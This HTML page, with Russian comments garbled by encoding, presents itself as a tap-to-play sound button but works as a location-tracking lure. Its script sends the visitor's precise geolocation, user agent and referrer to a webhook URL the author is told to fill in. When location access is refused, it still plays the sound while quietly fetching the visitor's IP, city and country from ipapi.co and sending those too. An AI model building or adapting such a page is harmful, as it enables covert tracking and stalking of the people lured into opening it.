<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND & LOCATION üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π webhook URL

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                console.log('Audio play failed:', error);
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–∫–∞—Ü–∏–∏
        function sendLocation(locationData) {
            fetch(MY_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    location: locationData,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer
                })
            }).catch(error => console.log('Error sending data'));
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –ª–æ–∫–∞—Ü–∏–∏
        function getLocationAndPlaySound() {
            statusDiv.innerHTML = 'üïê Requesting location...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // –£—Å–ø–µ—Ö - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑—Ä–µ—à–∏–ª –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters'
                        };
                        
                        statusDiv.innerHTML = `üìç Location: ${locationData.latitude}, ${locationData.longitude}`;
                        sendLocation(locationData);
                        
                        // –í–û–°–ü–†–û–ò–ó–í–û–î–ò–ú –ó–í–£–ö –ü–û–°–õ–ï –†–ê–ó–†–ï–®–ï–ù–ò–Ø –ì–ï–û–õ–û–ö–ê–¶–ò–ò
                        playSound();
                    },
                    // –û—à–∏–±–∫–∞ - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª
                    function(error) {
                        statusDiv.innerHTML = '‚ùå Location access denied';
                        
                        // –í—Å–µ —Ä–∞–≤–Ω–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫, –Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ IP
                        playSound();
                        
                        // –ü–æ–ª—É—á–∞–µ–º –ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—É—é –ª–æ–∫–∞—Ü–∏—é –ø–æ IP
                        fetch('https://ipapi.co/json/')
                            .then(response => response.json())
                            .then(ipData => {
                                sendLocation({
                                    ip: ipData.ip,
                                    city: ipData.city,
                                    country: ipData.country_name,
                                    approximate: true
                                });
                            });
                    },
                    // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                statusDiv.innerHTML = 'Geolocation not supported';
                playSound();
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –ø–æ –∫–Ω–æ–ø–∫–µ
        document.getElementById('playButton').addEventListener('click', function() {
            getLocationAndPlaySound();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            getLocationAndPlaySound();
        });
    </script>
</body>
</html>
